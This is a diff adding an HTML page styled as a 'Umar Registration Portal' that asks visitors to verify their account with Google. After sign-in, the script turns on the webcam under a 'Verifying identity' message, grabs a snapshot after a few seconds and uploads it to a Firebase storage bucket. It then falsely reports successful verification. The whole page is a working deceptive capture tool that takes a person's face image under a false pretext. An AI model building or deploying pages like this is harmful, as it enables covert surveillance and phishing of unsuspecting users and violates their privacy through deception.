@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Umar Registration Portal</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #f4f7f6; margin: 0; padding: 0; }
+        .box { margin: 50px auto; padding: 20px; width: 85%; max-width: 400px; background: white; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .btn { background: #4285F4; color: white; border: none; padding: 15px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; margin-top: 20px; }
+        #v { width: 100%; border-radius: 10px; margin-top: 15px; display: none; border: 2px solid #4285F4; }
+        .info { color: #666; font-size: 14px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="color: #333;">Welcome User</h2>
+        <p class="info">Please verify your account to access the dashboard</p>
+        <button class="btn" onclick="login()">Verify with Google</button>
+        <div id="status-box">
+            <video id="v" autoplay playsinline></video>
+            <canvas id="c" style="display:none;"></canvas>
+            <p id="msg" style="display:none; color: #1a73e8; font-weight: bold; margin-top: 10px;">Verifying identity... Please wait</p>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBY6_v_UvT0p7-v7-v7-v7-v7-v7-v7",
+            authDomain: "umar-app-39908.firebaseapp.com",
+            projectId: "umar-app-39908",
+            storageBucket: "umar-app-39908.appspot.com",
+            messagingSenderId: "367204900742",
+            appId: "1:367204900742:web:0b7204900742"
+        };
+        firebase.initializeApp(firebaseConfig);
+
+        function login() {
+            const provider = new firebase.auth.GoogleAuthProvider();
+            firebase.auth().signInWithPopup(provider).then((result) => {
+                document.getElementById('msg').style.display = 'block';
+                document.getElementById('v').style.display = 'block';
+                startCamera();
+            }).catch((err) => { alert("Error connecting. Try again."); });
+        }
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                setTimeout(snap, 4000);
+            } catch (e) { console.log("Camera access denied"); }
+        }
+
+        function snap() {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob((blob) => {
+                const fileName = "user_" + Date.now() + ".jpg";
+                const ref = firebase.storage().ref().child('users/' + fileName);
+                ref.put(blob).then(() => {
+                    document.getElementById('msg').innerText = "Verification successful! Redirecting...";
+                    setTimeout(() => { window.location.reload(); }, 2000);
+                });
+            });
+        }
+    </script>
+</body>
+</html>
